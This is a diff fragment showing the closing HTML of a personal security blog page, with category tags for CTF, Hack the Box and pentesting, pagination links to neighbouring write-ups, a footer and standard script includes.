+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#hack-the-box" class="page__taxonomy-item" rel="tag">Hack the box</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#pentesting" class="page__taxonomy-item" rel="tag">Pentesting</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2024-08-07T00:00:00+02:00">August 07, 2024</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/snapbot-python-scripting/" class="pagination--pager" title="SnapBot - Python scripting
+">Previous</a>
+    
+    
+      <a href="/boardlight-easy/" class="pagination--pager" title="Boardlight - Easy
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2024 0x832</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
